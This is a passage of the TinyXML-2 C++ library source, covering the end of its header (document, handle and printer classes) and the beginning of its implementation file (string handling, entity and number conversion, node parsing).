    ~XMLDocument();

    virtual XMLDocument* ToDocument()				{
        return this;
    }
    virtual const XMLDocument* ToDocument() const	{
        return this;
    }

    /**
    	Parse an XML file from a character string.
    	Returns XML_NO_ERROR (0) on success, or
    	an errorID.

    	You may optionally pass in the 'nBytes', which is
    	the number of bytes which will be parsed. If not
    	specified, TinyXML-2 will assume 'xml' points to a
    	null terminated string.
    */
    XMLError Parse( const char* xml, size_t nBytes=(size_t)(-1) );

    /**
    	Load an XML file from disk.
    	Returns XML_NO_ERROR (0) on success, or
    	an errorID.
    */
    XMLError LoadFile( const char* filename );

    /**
    	Load an XML file from disk. You are responsible
    	for providing and closing the FILE*. 
     
        NOTE: The file should be opened as binary ("rb")
        not text in order for TinyXML-2 to correctly
        do newline normalization.

    	Returns XML_NO_ERROR (0) on success, or
    	an errorID.
    */
    XMLError LoadFile( FILE* );

    /**
    	Save the XML file to disk.
    	Returns XML_NO_ERROR (0) on success, or
    	an errorID.
    */
    XMLError SaveFile( const char* filename, bool compact = false );

    /**
    	Save the XML file to disk. You are responsible
    	for providing and closing the FILE*.

    	Returns XML_NO_ERROR (0) on success, or
    	an errorID.
    */
    XMLError SaveFile( FILE* fp, bool compact = false );

    bool ProcessEntities() const		{
        return _processEntities;
    }
    Whitespace WhitespaceMode() const	{
        return _whitespace;
    }

    /**
    	Returns true if this document has a leading Byte Order Mark of UTF8.
    */
    bool HasBOM() const {
        return _writeBOM;
    }
    /** Sets whether to write the BOM when writing the file.
    */
    void SetBOM( bool useBOM ) {
        _writeBOM = useBOM;
    }

    /** Return the root element of DOM. Equivalent to FirstChildElement().
        To get the first node, use FirstChild().
    */
    XMLElement* RootElement()				{
        return FirstChildElement();
    }
    const XMLElement* RootElement() const	{  
        return FirstChildElement();
    }

    /** Print the Document. If the Printer is not provided, it will
        print to stdout. If you provide Printer, this can print to a file:
    	@verbatim
    	XMLPrinter printer( fp );
    	doc.Print( &printer );
    	@endverbatim

    	Or you can use a printer to print to memory:
    	XMLPrinter printer;
    	doc.Print( &printer );
    	// printer.CStr() has a const char* to the XML
    	@endverbatim
    */
    void Print( XMLPrinter* streamer=0 ) const;
    virtual bool Accept( XMLVisitor* visitor ) const;

    /**
    	Create a new Element associated with
    	this Document. The memory for the Element
    	is managed by the Document.
    */
    XMLElement* NewElement( const char* name );
    /**
    	Create a new Comment associated with
    	this Document. The memory for the Comment
    	is managed by the Document.
    */
    XMLComment* NewComment( const char* comment );
    /**
    	Create a new Text associated with
    	this Document. The memory for the Text
    	is managed by the Document.
    */
    XMLText* NewText( const char* text );
    /**
    	Create a new Declaration associated with
    	this Document. The memory for the object
    	is managed by the Document.

    	If the 'text' param is null, the standard
    	declaration is used.:
    	@verbatim
    		<?xml version="1.0" encoding="UTF-8"?>
    	@endverbatim
    */
    XMLDeclaration* NewDeclaration( const char* text=0 );
    /**
    	Create a new Unknown associated with
    	this Document. The memory for the object
    	is managed by the Document.
    */
    XMLUnknown* NewUnknown( const char* text );

    /**
    	Delete a node associated with this document.
    	It will be unlinked from the DOM.
    */
    void DeleteNode( XMLNode* node );

    void SetError( XMLError error, const char* str1, const char* str2 );

    /// Return true if there was an error parsing the document.
    bool Error() const {
        return _errorID != XML_NO_ERROR;
    }
    /// Return the errorID.
    XMLError  ErrorID() const {
        return _errorID;
    }
	const char* ErrorName() const;

    /// Return a possibly helpful diagnostic location or string.
    const char* GetErrorStr1() const {
        return _errorStr1;
    }
    /// Return a possibly helpful secondary diagnostic location or string.
    const char* GetErrorStr2() const {
        return _errorStr2;
    }
    /// If there is an error, print it to stdout.
    void PrintError() const;
    
    /// Clear the document, resetting it to the initial state.
    void Clear();

    // internal
    char* Identify( char* p, XMLNode** node );

    virtual XMLNode* ShallowClone( XMLDocument* /*document*/ ) const	{
        return 0;
    }
    virtual bool ShallowEqual( const XMLNode* /*compare*/ ) const	{
        return false;
    }

private:
    XMLDocument( const XMLDocument& );	// not supported
    void operator=( const XMLDocument& );	// not supported

    bool        _writeBOM;
    bool        _processEntities;
    XMLError    _errorID;
    Whitespace  _whitespace;
    const char* _errorStr1;
    const char* _errorStr2;
    char*       _charBuffer;

    MemPoolT< sizeof(XMLElement) >	 _elementPool;
    MemPoolT< sizeof(XMLAttribute) > _attributePool;
    MemPoolT< sizeof(XMLText) >		 _textPool;
    MemPoolT< sizeof(XMLComment) >	 _commentPool;

	static const char* _errorNames[XML_ERROR_COUNT];

    void Parse();
};


/**
	A XMLHandle is a class that wraps a node pointer with null checks; this is
	an incredibly useful thing. Note that XMLHandle is not part of the TinyXML-2
	DOM structure. It is a separate utility class.

	Take an example:
	@verbatim
	<Document>
		<Element attributeA = "valueA">
			<Child attributeB = "value1" />
			<Child attributeB = "value2" />
		</Element>
	</Document>
	@endverbatim

	Assuming you want the value of "attributeB" in the 2nd "Child" element, it's very
	easy to write a *lot* of code that looks like:

	@verbatim
	XMLElement* root = document.FirstChildElement( "Document" );
	if ( root )
	{
		XMLElement* element = root->FirstChildElement( "Element" );
		if ( element )
		{
			XMLElement* child = element->FirstChildElement( "Child" );
			if ( child )
			{
				XMLElement* child2 = child->NextSiblingElement( "Child" );
				if ( child2 )
				{
					// Finally do something useful.
	@endverbatim

	And that doesn't even cover "else" cases. XMLHandle addresses the verbosity
	of such code. A XMLHandle checks for null pointers so it is perfectly safe
	and correct to use:

	@verbatim
	XMLHandle docHandle( &document );
	XMLElement* child2 = docHandle.FirstChildElement( "Document" ).FirstChildElement( "Element" ).FirstChildElement().NextSiblingElement();
	if ( child2 )
	{
		// do something useful
	@endverbatim

	Which is MUCH more concise and useful.

	It is also safe to copy handles - internally they are nothing more than node pointers.
	@verbatim
	XMLHandle handleCopy = handle;
	@endverbatim

	See also XMLConstHandle, which is the same as XMLHandle, but operates on const objects.
*/
class TINYXML2_LIB XMLHandle
{
public:
    /// Create a handle from any node (at any depth of the tree.) This can be a null pointer.
    XMLHandle( XMLNode* node )												{
        _node = node;
    }
    /// Create a handle from a node.
    XMLHandle( XMLNode& node )												{
        _node = &node;
    }
    /// Copy constructor
    XMLHandle( const XMLHandle& ref )										{
        _node = ref._node;
    }
    /// Assignment
    XMLHandle& operator=( const XMLHandle& ref )							{
        _node = ref._node;
        return *this;
    }

    /// Get the first child of this handle.
    XMLHandle FirstChild() 													{
        return XMLHandle( _node ? _node->FirstChild() : 0 );
    }
    /// Get the first child element of this handle.
    XMLHandle FirstChildElement( const char* value=0 )						{
        return XMLHandle( _node ? _node->FirstChildElement( value ) : 0 );
    }
    /// Get the last child of this handle.
    XMLHandle LastChild()													{
        return XMLHandle( _node ? _node->LastChild() : 0 );
    }
    /// Get the last child element of this handle.
    XMLHandle LastChildElement( const char* _value=0 )						{
        return XMLHandle( _node ? _node->LastChildElement( _value ) : 0 );
    }
    /// Get the previous sibling of this handle.
    XMLHandle PreviousSibling()												{
        return XMLHandle( _node ? _node->PreviousSibling() : 0 );
    }
    /// Get the previous sibling element of this handle.
    XMLHandle PreviousSiblingElement( const char* _value=0 )				{
        return XMLHandle( _node ? _node->PreviousSiblingElement( _value ) : 0 );
    }
    /// Get the next sibling of this handle.
    XMLHandle NextSibling()													{
        return XMLHandle( _node ? _node->NextSibling() : 0 );
    }
    /// Get the next sibling element of this handle.
    XMLHandle NextSiblingElement( const char* _value=0 )					{
        return XMLHandle( _node ? _node->NextSiblingElement( _value ) : 0 );
    }

    /// Safe cast to XMLNode. This can return null.
    XMLNode* ToNode()							{
        return _node;
    }
    /// Safe cast to XMLElement. This can return null.
    XMLElement* ToElement() 					{
        return ( ( _node == 0 ) ? 0 : _node->ToElement() );
    }
    /// Safe cast to XMLText. This can return null.
    XMLText* ToText() 							{
        return ( ( _node == 0 ) ? 0 : _node->ToText() );
    }
    /// Safe cast to XMLUnknown. This can return null.
    XMLUnknown* ToUnknown() 					{
        return ( ( _node == 0 ) ? 0 : _node->ToUnknown() );
    }
    /// Safe cast to XMLDeclaration. This can return null.
    XMLDeclaration* ToDeclaration() 			{
        return ( ( _node == 0 ) ? 0 : _node->ToDeclaration() );
    }

private:
    XMLNode* _node;
};


/**
	A variant of the XMLHandle class for working with const XMLNodes and Documents. It is the
	same in all regards, except for the 'const' qualifiers. See XMLHandle for API.
*/
class TINYXML2_LIB XMLConstHandle
{
public:
    XMLConstHandle( const XMLNode* node )											{
        _node = node;
    }
    XMLConstHandle( const XMLNode& node )											{
        _node = &node;
    }
    XMLConstHandle( const XMLConstHandle& ref )										{
        _node = ref._node;
    }

    XMLConstHandle& operator=( const XMLConstHandle& ref )							{
        _node = ref._node;
        return *this;
    }

    const XMLConstHandle FirstChild() const											{
        return XMLConstHandle( _node ? _node->FirstChild() : 0 );
    }
    const XMLConstHandle FirstChildElement( const char* value=0 ) const				{
        return XMLConstHandle( _node ? _node->FirstChildElement( value ) : 0 );
    }
    const XMLConstHandle LastChild()	const										{
        return XMLConstHandle( _node ? _node->LastChild() : 0 );
    }
    const XMLConstHandle LastChildElement( const char* _value=0 ) const				{
        return XMLConstHandle( _node ? _node->LastChildElement( _value ) : 0 );
    }
    const XMLConstHandle PreviousSibling() const									{
        return XMLConstHandle( _node ? _node->PreviousSibling() : 0 );
    }
    const XMLConstHandle PreviousSiblingElement( const char* _value=0 ) const		{
        return XMLConstHandle( _node ? _node->PreviousSiblingElement( _value ) : 0 );
    }
    const XMLConstHandle NextSibling() const										{
        return XMLConstHandle( _node ? _node->NextSibling() : 0 );
    }
    const XMLConstHandle NextSiblingElement( const char* _value=0 ) const			{
        return XMLConstHandle( _node ? _node->NextSiblingElement( _value ) : 0 );
    }


    const XMLNode* ToNode() const				{
        return _node;
    }
    const XMLElement* ToElement() const			{
        return ( ( _node == 0 ) ? 0 : _node->ToElement() );
    }
    const XMLText* ToText() const				{
        return ( ( _node == 0 ) ? 0 : _node->ToText() );
    }
    const XMLUnknown* ToUnknown() const			{
        return ( ( _node == 0 ) ? 0 : _node->ToUnknown() );
    }
    const XMLDeclaration* ToDeclaration() const	{
        return ( ( _node == 0 ) ? 0 : _node->ToDeclaration() );
    }

private:
    const XMLNode* _node;
};


/**
	Printing functionality. The XMLPrinter gives you more
	options than the XMLDocument::Print() method.

	It can:
	-# Print to memory.
	-# Print to a file you provide.
	-# Print XML without a XMLDocument.

	Print to Memory

	@verbatim
	XMLPrinter printer;
	doc.Print( &printer );
	SomeFunction( printer.CStr() );
	@endverbatim

	Print to a File

	You provide the file pointer.
	@verbatim
	XMLPrinter printer( fp );
	doc.Print( &printer );
	@endverbatim

	Print without a XMLDocument

	When loading, an XML parser is very useful. However, sometimes
	when saving, it just gets in the way. The code is often set up
	for streaming, and constructing the DOM is just overhead.

	The Printer supports the streaming case. The following code
	prints out a trivially simple XML file without ever creating
	an XML document.

	@verbatim
	XMLPrinter printer( fp );
	printer.OpenElement( "foo" );
	printer.PushAttribute( "foo", "bar" );
	printer.CloseElement();
	@endverbatim
*/
class TINYXML2_LIB XMLPrinter : public XMLVisitor
{
public:
    /** Construct the printer. If the FILE* is specified,
    	this will print to the FILE. Else it will print
    	to memory, and the result is available in CStr().
    	If 'compact' is set to true, then output is created
    	with only required whitespace and newlines.
    */
    XMLPrinter( FILE* file=0, bool compact = false, int depth = 0 );
    virtual ~XMLPrinter()	{}

    /** If streaming, write the BOM and declaration. */
    void PushHeader( bool writeBOM, bool writeDeclaration );
    /** If streaming, start writing an element.
        The element must be closed with CloseElement()
    */
    void OpenElement( const char* name, bool compactMode=false );
    /// If streaming, add an attribute to an open element.
    void PushAttribute( const char* name, const char* value );
    void PushAttribute( const char* name, int value );
    void PushAttribute( const char* name, unsigned value );
    void PushAttribute( const char* name, bool value );
    void PushAttribute( const char* name, double value );
    /// If streaming, close the Element.
    virtual void CloseElement( bool compactMode=false );

    /// Add a text node.
    void PushText( const char* text, bool cdata=false );
    /// Add a text node from an integer.
    void PushText( int value );
    /// Add a text node from an unsigned.
    void PushText( unsigned value );
    /// Add a text node from a bool.
    void PushText( bool value );
    /// Add a text node from a float.
    void PushText( float value );
    /// Add a text node from a double.
    void PushText( double value );

    /// Add a comment
    void PushComment( const char* comment );

    void PushDeclaration( const char* value );
    void PushUnknown( const char* value );

    virtual bool VisitEnter( const XMLDocument& /*doc*/ );
    virtual bool VisitExit( const XMLDocument& /*doc*/ )			{
        return true;
    }

    virtual bool VisitEnter( const XMLElement& element, const XMLAttribute* attribute );
    virtual bool VisitExit( const XMLElement& element );

    virtual bool Visit( const XMLText& text );
    virtual bool Visit( const XMLComment& comment );
    virtual bool Visit( const XMLDeclaration& declaration );
    virtual bool Visit( const XMLUnknown& unknown );

    /**
    	If in print to memory mode, return a pointer to
    	the XML file in memory.
    */
    const char* CStr() const {
        return _buffer.Mem();
    }
    /**
    	If in print to memory mode, return the size
    	of the XML file in memory. (Note the size returned
    	includes the terminating null.)
    */
    int CStrSize() const {
        return _buffer.Size();
    }
    /**
    	If in print to memory mode, reset the buffer to the
    	beginning.
    */
    void ClearBuffer() {
        _buffer.Clear();
        _buffer.Push(0);
    }

protected:
	virtual bool CompactMode( const XMLElement& )	{ return _compactMode; }

	/** Prints out the space before an element. You may override to change
	    the space and tabs used. A PrintSpace() override should call Print().
	*/
    virtual void PrintSpace( int depth );
    void Print( const char* format, ... );

    void SealElementIfJustOpened();
    bool _elementJustOpened;
    DynArray< const char*, 10 > _stack;

private:
    void PrintString( const char*, bool restrictedEntitySet );	// prints out, after detecting entities.

    bool _firstElement;
    FILE* _fp;
    int _depth;
    int _textDepth;
    bool _processEntities;
	bool _compactMode;

    enum {
        ENTITY_RANGE = 64,
        BUF_SIZE = 200
    };
    bool _entityFlag[ENTITY_RANGE];
    bool _restrictedEntityFlag[ENTITY_RANGE];

    DynArray< char, 20 > _buffer;
};


}	// tinyxml2

#if defined(_MSC_VER)
#   pragma warning(pop)
#endif

#endif // TINYXML2_INCLUDED


 
tinyxml2.cpp
/*
Original code by Lee Thomason (www.grinninglizard.com)

This software is provided 'as-is', without any express or implied
warranty. In no event will the authors be held liable for any
damages arising from the use of this software.

Permission is granted to anyone to use this software for any
purpose, including commercial applications, and to alter it and
redistribute it freely, subject to the following restrictions:

1. The origin of this software must not be misrepresented; you must
not claim that you wrote the original software. If you use this
software in a product, an acknowledgment in the product documentation
would be appreciated but is not required.

2. Altered source versions must be plainly marked as such, and
must not be misrepresented as being the original software.

3. This notice may not be removed or altered from any source
distribution.
*/

#include "tinyxml2.h"

#include <new>		// yes, this one new style header, is in the Android SDK.
#if defined(ANDROID_NDK) || defined(__QNXNTO__)
#   include <stddef.h>
#else
#   include <cstddef>
#endif

static const char LINE_FEED				= (char)0x0a;			// all line endings are normalized to LF
static const char LF = LINE_FEED;
static const char CARRIAGE_RETURN		= (char)0x0d;			// CR gets filtered out
static const char CR = CARRIAGE_RETURN;
static const char SINGLE_QUOTE			= '\'';
static const char DOUBLE_QUOTE			= '\"';

// Bunch of unicode info at:
//		http://www.unicode.org/faq/utf_bom.html
//	ef bb bf (Microsoft "lead bytes") - designates UTF-8

static const unsigned char TIXML_UTF_LEAD_0 = 0xefU;
static const unsigned char TIXML_UTF_LEAD_1 = 0xbbU;
static const unsigned char TIXML_UTF_LEAD_2 = 0xbfU;

namespace tinyxml2
{

struct Entity {
    const char* pattern;
    int length;
    char value;
};

static const int NUM_ENTITIES = 5;
static const Entity entities[NUM_ENTITIES] = {
    { "quot", 4,	DOUBLE_QUOTE },
    { "amp", 3,		'&'  },
    { "apos", 4,	SINGLE_QUOTE },
    { "lt",	2, 		'<'	 },
    { "gt",	2,		'>'	 }
};


StrPair::~StrPair()
{
    Reset();
}


void StrPair::TransferTo( StrPair* other )
{
    if ( this == other ) {
        return;
    }
    // This in effect implements the assignment operator by "moving"
    // ownership (as in auto_ptr).

    TIXMLASSERT( other->_flags == 0 );
    TIXMLASSERT( other->_start == 0 );
    TIXMLASSERT( other->_end == 0 );

    other->Reset();

    other->_flags = _flags;
    other->_start = _start;
    other->_end = _end;

    _flags = 0;
    _start = 0;
    _end = 0;
}

void StrPair::Reset()
{
    if ( _flags & NEEDS_DELETE ) {
        delete [] _start;
    }
    _flags = 0;
    _start = 0;
    _end = 0;
}


void StrPair::SetStr( const char* str, int flags )
{
    Reset();
    size_t len = strlen( str );
    _start = new char[ len+1 ];
    memcpy( _start, str, len+1 );
    _end = _start + len;
    _flags = flags | NEEDS_DELETE;
}


char* StrPair::ParseText( char* p, const char* endTag, int strFlags )
{
    TIXMLASSERT( endTag && *endTag );

    char* start = p;
    char  endChar = *endTag;
    size_t length = strlen( endTag );

    // Inner loop of text parsing.
    while ( *p ) {
        if ( *p == endChar && strncmp( p, endTag, length ) == 0 ) {
            Set( start, p, strFlags );
            return p + length;
        }
        ++p;
    }
    return 0;
}


char* StrPair::ParseName( char* p )
{
    if ( !p || !(*p) ) {
        return 0;
    }
    if ( !XMLUtil::IsNameStartChar( *p ) ) {
        return 0;
    }

    char* const start = p;
    ++p;
    while ( *p && XMLUtil::IsNameChar( *p ) ) {
        ++p;
    }

    Set( start, p, 0 );
    return p;
}


void StrPair::CollapseWhitespace()
{
    // Adjusting _start would cause undefined behavior on delete[]
    TIXMLASSERT( ( _flags & NEEDS_DELETE ) == 0 );
    // Trim leading space.
    _start = XMLUtil::SkipWhiteSpace( _start );

    if ( *_start ) {
        char* p = _start;	// the read pointer
        char* q = _start;	// the write pointer

        while( *p ) {
            if ( XMLUtil::IsWhiteSpace( *p )) {
                p = XMLUtil::SkipWhiteSpace( p );
                if ( *p == 0 ) {
                    break;    // don't write to q; this trims the trailing space.
                }
                *q = ' ';
                ++q;
            }
            *q = *p;
            ++q;
            ++p;
        }
        *q = 0;
    }
}


const char* StrPair::GetStr()
{
    TIXMLASSERT( _start );
    TIXMLASSERT( _end );
    if ( _flags & NEEDS_FLUSH ) {
        *_end = 0;
        _flags ^= NEEDS_FLUSH;

        if ( _flags ) {
            char* p = _start;	// the read pointer
            char* q = _start;	// the write pointer

            while( p < _end ) {
                if ( (_flags & NEEDS_NEWLINE_NORMALIZATION) && *p == CR ) {
                    // CR-LF pair becomes LF
                    // CR alone becomes LF
                    // LF-CR becomes LF
                    if ( *(p+1) == LF ) {
                        p += 2;
                    }
                    else {
                        ++p;
                    }
                    *q++ = LF;
                }
                else if ( (_flags & NEEDS_NEWLINE_NORMALIZATION) && *p == LF ) {
                    if ( *(p+1) == CR ) {
                        p += 2;
                    }
                    else {
                        ++p;
                    }
                    *q++ = LF;
                }
                else if ( (_flags & NEEDS_ENTITY_PROCESSING) && *p == '&' ) {
                    // Entities handled by tinyXML2:
                    // - special entities in the entity table [in/out]
                    // - numeric character reference [in]
                    //   中 or 中

                    if ( *(p+1) == '#' ) {
                        const int buflen = 10;
                        char buf[buflen] = { 0 };
                        int len = 0;
                        char* adjusted = const_cast<char*>( XMLUtil::GetCharacterRef( p, buf, &len ) );
                        if ( adjusted == 0 ) {
                            *q = *p;
                            ++p;
                            ++q;
                        }
                        else {
                            TIXMLASSERT( 0 <= len && len <= buflen );
                            TIXMLASSERT( q + len <= adjusted );
                            p = adjusted;
                            memcpy( q, buf, len );
                            q += len;
                        }
                    }
                    else {
                        int i=0;
                        for(; i<NUM_ENTITIES; ++i ) {
                            const Entity& entity = entities[i];
                            if ( strncmp( p + 1, entity.pattern, entity.length ) == 0
                                    && *( p + entity.length + 1 ) == ';' ) {
                                // Found an entity - convert.
                                *q = entity.value;
                                ++q;
                                p += entity.length + 2;
                                break;
                            }
                        }
                        if ( i == NUM_ENTITIES ) {
                            // fixme: treat as error?
                            ++p;
                            ++q;
                        }
                    }
                }
                else {
                    *q = *p;
                    ++p;
                    ++q;
                }
            }
            *q = 0;
        }
        // The loop below has plenty going on, and this
        // is a less useful mode. Break it out.
        if ( _flags & COLLAPSE_WHITESPACE ) {
            CollapseWhitespace();
        }
        _flags = (_flags & NEEDS_DELETE);
    }
    TIXMLASSERT( _start );
    return _start;
}




// --------- XMLUtil ----------- //

const char* XMLUtil::ReadBOM( const char* p, bool* bom )
{
    TIXMLASSERT( p );
    TIXMLASSERT( bom );
    *bom = false;
    const unsigned char* pu = reinterpret_cast<const unsigned char*>(p);
    // Check for BOM:
    if (    *(pu+0) == TIXML_UTF_LEAD_0
            && *(pu+1) == TIXML_UTF_LEAD_1
            && *(pu+2) == TIXML_UTF_LEAD_2 ) {
        *bom = true;
        p += 3;
    }
    TIXMLASSERT( p );
    return p;
}


void XMLUtil::ConvertUTF32ToUTF8( unsigned long input, char* output, int* length )
{
    const unsigned long BYTE_MASK = 0xBF;
    const unsigned long BYTE_MARK = 0x80;
    const unsigned long FIRST_BYTE_MARK[7] = { 0x00, 0x00, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC };

    if (input < 0x80) {
        *length = 1;
    }
    else if ( input < 0x800 ) {
        *length = 2;
    }
    else if ( input < 0x10000 ) {
        *length = 3;
    }
    else if ( input < 0x200000 ) {
        *length = 4;
    }
    else {
        *length = 0;    // This code won't convert this correctly anyway.
        return;
    }

    output += *length;

    // Scary scary fall throughs.
    switch (*length) {
        case 4:
            --output;
            *output = (char)((input | BYTE_MARK) & BYTE_MASK);
            input >>= 6;
        case 3:
            --output;
            *output = (char)((input | BYTE_MARK) & BYTE_MASK);
            input >>= 6;
        case 2:
            --output;
            *output = (char)((input | BYTE_MARK) & BYTE_MASK);
            input >>= 6;
        case 1:
            --output;
            *output = (char)(input | FIRST_BYTE_MARK[*length]);
            break;
        default:
            TIXMLASSERT( false );
    }
}


const char* XMLUtil::GetCharacterRef( const char* p, char* value, int* length )
{
    // Presume an entity, and pull it out.
    *length = 0;

    if ( *(p+1) == '#' && *(p+2) ) {
        unsigned long ucs = 0;
        TIXMLASSERT( sizeof( ucs ) >= 4 );
        ptrdiff_t delta = 0;
        unsigned mult = 1;
        static const char SEMICOLON = ';';

        if ( *(p+2) == 'x' ) {
            // Hexadecimal.
            const char* q = p+3;
            if ( !(*q) ) {
                return 0;
            }

            q = strchr( q, SEMICOLON );

            if ( !q ) {
                return 0;
            }
            TIXMLASSERT( *q == SEMICOLON );

            delta = q-p;
            --q;

            while ( *q != 'x' ) {
                unsigned int digit = 0;

                if ( *q >= '0' && *q <= '9' ) {
                    digit = *q - '0';
                }
                else if ( *q >= 'a' && *q <= 'f' ) {
                    digit = *q - 'a' + 10;
                }
                else if ( *q >= 'A' && *q <= 'F' ) {
                    digit = *q - 'A' + 10;
                }
                else {
                    return 0;
                }
                TIXMLASSERT( digit >= 0 && digit < 16);
                TIXMLASSERT( digit == 0 || mult <= UINT_MAX / digit );
                const unsigned int digitScaled = mult * digit;
                TIXMLASSERT( ucs <= ULONG_MAX - digitScaled );
                ucs += digitScaled;
                TIXMLASSERT( mult <= UINT_MAX / 16 );
                mult *= 16;
                --q;
            }
        }
        else {
            // Decimal.
            const char* q = p+2;
            if ( !(*q) ) {
                return 0;
            }

            q = strchr( q, SEMICOLON );

            if ( !q ) {
                return 0;
            }
            TIXMLASSERT( *q == SEMICOLON );

            delta = q-p;
            --q;

            while ( *q != '#' ) {
                if ( *q >= '0' && *q <= '9' ) {
                    const unsigned int digit = *q - '0';
                    TIXMLASSERT( digit >= 0 && digit < 10);
                    TIXMLASSERT( digit == 0 || mult <= UINT_MAX / digit );
                    const unsigned int digitScaled = mult * digit;
                    TIXMLASSERT( ucs <= ULONG_MAX - digitScaled );
                    ucs += digitScaled;
                }
                else {
                    return 0;
                }
                TIXMLASSERT( mult <= UINT_MAX / 10 );
                mult *= 10;
                --q;
            }
        }
        // convert the UCS to UTF-8
        ConvertUTF32ToUTF8( ucs, value, length );
        return p + delta + 1;
    }
    return p+1;
}


void XMLUtil::ToStr( int v, char* buffer, int bufferSize )
{
    TIXML_SNPRINTF( buffer, bufferSize, "%d", v );
}


void XMLUtil::ToStr( unsigned v, char* buffer, int bufferSize )
{
    TIXML_SNPRINTF( buffer, bufferSize, "%u", v );
}


void XMLUtil::ToStr( bool v, char* buffer, int bufferSize )
{
    TIXML_SNPRINTF( buffer, bufferSize, "%d", v ? 1 : 0 );
}

/*
	ToStr() of a number is a very tricky topic.
	https://github.com/leethomason/tinyxml2/issues/106
*/
void XMLUtil::ToStr( float v, char* buffer, int bufferSize )
{
    TIXML_SNPRINTF( buffer, bufferSize, "%.8g", v );
}


void XMLUtil::ToStr( double v, char* buffer, int bufferSize )
{
    TIXML_SNPRINTF( buffer, bufferSize, "%.17g", v );
}


bool XMLUtil::ToInt( const char* str, int* value )
{
    if ( TIXML_SSCANF( str, "%d", value ) == 1 ) {
        return true;
    }
    return false;
}

bool XMLUtil::ToUnsigned( const char* str, unsigned *value )
{
    if ( TIXML_SSCANF( str, "%u", value ) == 1 ) {
        return true;
    }
    return false;
}

bool XMLUtil::ToBool( const char* str, bool* value )
{
    int ival = 0;
    if ( ToInt( str, &ival )) {
        *value = (ival==0) ? false : true;
        return true;
    }
    if ( StringEqual( str, "true" ) ) {
        *value = true;
        return true;
    }
    else if ( StringEqual( str, "false" ) ) {
        *value = false;
        return true;
    }
    return false;
}


bool XMLUtil::ToFloat( const char* str, float* value )
{
    if ( TIXML_SSCANF( str, "%f", value ) == 1 ) {
        return true;
    }
    return false;
}

bool XMLUtil::ToDouble( const char* str, double* value )
{
    if ( TIXML_SSCANF( str, "%lf", value ) == 1 ) {
        return true;
    }
    return false;
}


char* XMLDocument::Identify( char* p, XMLNode** node )
{
    TIXMLASSERT( node );
    TIXMLASSERT( p );
    char* const start = p;
    p = XMLUtil::SkipWhiteSpace( p );
    if( !*p ) {
        *node = 0;
        TIXMLASSERT( p );
        return p;
    }

    // What is this thing?
	// These strings define the matching patters:
    static const char* xmlHeader		= { "<?" };
    static const char* commentHeader	= { "<!--" };
    static const char* cdataHeader		= { "<![CDATA[" };
    static const char* dtdHeader		= { "<!" };
    static const char* elementHeader	= { "<" };	// and a header for everything else; check last.

    static const int xmlHeaderLen		= 2;
    static const int commentHeaderLen	= 4;
    static const int cdataHeaderLen		= 9;
    static const int dtdHeaderLen		= 2;
    static const int elementHeaderLen	= 1;

    TIXMLASSERT( sizeof( XMLComment ) == sizeof( XMLUnknown ) );		// use same memory pool
    TIXMLASSERT( sizeof( XMLComment ) == sizeof( XMLDeclaration ) );	// use same memory pool
    XMLNode* returnNode = 0;
    if ( XMLUtil::StringEqual( p, xmlHeader, xmlHeaderLen ) ) {
        TIXMLASSERT( sizeof( XMLDeclaration ) == _commentPool.ItemSize() );
        returnNode = new (_commentPool.Alloc()) XMLDeclaration( this );
        returnNode->_memPool = &_commentPool;
        p += xmlHeaderLen;
    }
    else if ( XMLUtil::StringEqual( p, commentHeader, commentHeaderLen ) ) {
        TIXMLASSERT( sizeof( XMLComment ) == _commentPool.ItemSize() );
        returnNode = new (_commentPool.Alloc()) XMLComment( this );
        returnNode->_memPool = &_commentPool;
        p += commentHeaderLen;
    }
    else if ( XMLUtil::StringEqual( p, cdataHeader, cdataHeaderLen ) ) {
        TIXMLASSERT( sizeof( XMLText ) == _textPool.ItemSize() );
        XMLText* text = new (_textPool.Alloc()) XMLText( this );
        returnNode = text;
        returnNode->_memPool = &_textPool;
        p += cdataHeaderLen;
        text->SetCData( true );
    }
    else if ( XMLUtil::StringEqual( p, dtdHeader, dtdHeaderLen ) ) {
        TIXMLASSERT( sizeof( XMLUnknown ) == _commentPool.ItemSize() );
        returnNode = new (_commentPool.Alloc()) XMLUnknown( this );
        returnNode->_memPool = &_commentPool;
        p += dtdHeaderLen;
    }
    else if ( XMLUtil::StringEqual( p, elementHeader, elementHeaderLen ) ) {
        TIXMLASSERT( sizeof( XMLElement ) == _elementPool.ItemSize() );
        returnNode = new (_elementPool.Alloc()) XMLElement( this );
        returnNode->_memPool = &_elementPool;
        p += elementHeaderLen;
    }
    else {
        TIXMLASSERT( sizeof( XMLText ) == _textPool.ItemSize() );
        returnNode = new (_textPool.Alloc()) XMLText( this );
        returnNode->_memPool = &_textPool;
        p = start;	// Back it up, all the text counts.
    }

    TIXMLASSERT( returnNode );
    TIXMLASSERT( p );
    *node = returnNode;
    return p;
}


bool XMLDocument::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    if ( visitor->VisitEnter( *this ) ) {
        for ( const XMLNode* node=FirstChild(); node; node=node->NextSibling() ) {
            if ( !node->Accept( visitor ) ) {
                break;
            }
        }
    }
    return visitor->VisitExit( *this );
}


// --------- XMLNode ----------- //

XMLNode::XMLNode( XMLDocument* doc ) :
    _document( doc ),
    _parent( 0 ),
    _firstChild( 0 ), _lastChild( 0 ),
    _prev( 0 ), _next( 0 ),
    _memPool( 0 )
{
}


XMLNode::~XMLNode()
{
    DeleteChildren();
    if ( _parent ) {
        _parent->Unlink( this );
    }
}

const char* XMLNode::Value() const 
{
    return _value.GetStr();
}

void XMLNode::SetValue( const char* str, bool staticMem )
{
    if ( staticMem ) {
        _value.SetInternedStr( str );
    }
    else {
        _value.SetStr( str );
    }
}


void XMLNode::DeleteChildren()
{
    while( _firstChild ) {
        TIXMLASSERT( _lastChild );
        TIXMLASSERT( _firstChild->_document == _document );
        XMLNode* node = _firstChild;
        Unlink( node );

        DeleteNode( node );
    }
    _firstChild = _lastChild = 0;
}


void XMLNode::Unlink( XMLNode* child )
{
    TIXMLASSERT( child );
    TIXMLASSERT( child->_document == _document );
    TIXMLASSERT( child->_parent == this );
    if ( child == _firstChild ) {
        _firstChild = _firstChild->_next;
    }
    if ( child == _lastChild ) {
        _lastChild = _lastChild->_prev;
    }

    if ( child->_prev ) {
        child->_prev->_next = child->_next;
    }
    if ( child->_next ) {
        child->_next->_prev = child->_prev;
    }
	child->_parent = 0;
}


void XMLNode::DeleteChild( XMLNode* node )
{
    TIXMLASSERT( node );
    TIXMLASSERT( node->_document == _document );
    TIXMLASSERT( node->_parent == this );
    DeleteNode( node );
